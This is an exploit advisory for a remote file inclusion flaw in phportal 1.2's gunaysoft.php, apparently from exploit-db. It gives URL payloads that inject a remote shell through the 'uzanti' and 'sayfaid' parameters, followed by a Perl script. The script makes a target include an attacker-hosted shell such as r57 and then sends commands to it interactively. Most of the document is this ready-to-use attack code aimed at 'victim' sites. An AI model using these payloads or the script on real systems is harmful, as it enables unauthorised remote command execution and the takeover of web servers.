# Tilte: phportal_1.2 (gunaysoft.php) Remote File Include Vulnerability

# Author..................: [Ma3sTr0-Dz]
# Location ...............: [ALGERIA]
# Software ...............: [phportal_1.2]
# Impact..................: [Remote]
# Advisory ...............: [exploit-db.com]
# Site Software ..........: [http://sourceforge.net/project/showfiles.php?group_id=205263]
# Sptnx ..................: [Www.Sec4ever.Com Work Group & Members .]


# Vulnerability: Remote File Inclusion Vulnerability



# Part Expl0it & Bug Codes :

---

http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?uzanti=[shell]
http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?sayfaid=[shell]
http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?uzanti=[shell]

---

Exploit Perl :

---

#!/usr/bin/perl

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = "sablonlar/gunaysoft/gunaysoft.php?uzanti=";

if(!$target || !$shellsite)
{
usage();
}

header();

print "Type 'exit' to quit";
print "[cmd]\$";
$cmd = <STDIN>;

while ($cmd !~ "exit")
{
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd) or die("\n\n Failed to connect.");
$res = $xpl->request($req);
$r = $res->content;
$r =~ tr/[\n]/[ê]/;

if (@ARGV[4] eq "-r")
{
print $r;
}
elsif (@ARGV[5] eq "-p")
{
# if not working change cmd variable to null and apply patch manually.
$cmd = "echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); >> list_last.inc";
print q
{

}
}
else
{
print "[cmd]\$";
$cmd = <STDIN>;
}
}

sub header()
{
print q
{
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Discovered by : Ma3sTr0-Dz
phportal.pl - Remote File Include Exploit

o5m@hotmail.de
sp TANX2: Www.Sec4ever.Com/home/ & Cmos_CLR
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
};
}

sub usage()
{
header();
print q
{
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Usage:
perl phportal.pl <Target website> <Shell Location> <CMD Variable> <-r> <-p>
<Target Website> - Path to target eg: www.victim.com
<Shell Location> - Path to shell eg: http://site.com/r57.txt?
<CMD Variable> - Shell command variable name eg: Pwd
<r> - Show output from shell
<p> - sablonlar/gunaysoft/gunaysoft.php
Example:
perl phportal.pl http://localhost/include http://localhost/r57.php cmd -r -p
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
};
exit();
}